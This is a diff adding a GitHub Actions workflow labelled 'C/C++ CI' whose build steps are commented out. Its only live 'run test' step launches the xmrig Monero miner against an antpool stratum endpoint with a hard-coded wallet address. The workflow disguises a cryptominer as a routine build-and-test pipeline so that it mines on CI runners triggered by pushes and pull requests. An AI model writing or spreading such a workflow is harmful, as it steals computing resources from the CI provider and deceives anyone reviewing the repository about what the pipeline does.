@@ -1,0 +1,36 @@
+# This is a basic workflow to help you get started with Actions
+
+name: C/C++ CI
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v2
+#     - name: show files
+#       run: ls
+#     - name: dir
+#       run: mkdir build
+    - name: apt-get 
+      run: sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+#     - name: show files
+#       run: ls
+#     - name: cmake
+#       run: cd build && cmake ..
+#     - name: make
+#       run: cd build && make
+#     - name : Upload artifact -test
+#       uses: actions/upload-artifact@master
+#       with:
+#         name: xmrig
+#         path: build/
+    - name: run test
+      run: ./xmrig --donate-level 1 -o stratum+tcp://xmr.antpool.com:9005 -u 4AzWBLaH4e2MAut9nSMHi4D3ccpY2vqsSA4TBerGmcGM3Gmr89TUqq9QFBevDhzzCPZwSXCUXTXCDZHYVenZscdX9rj2otM -k -a rx/0
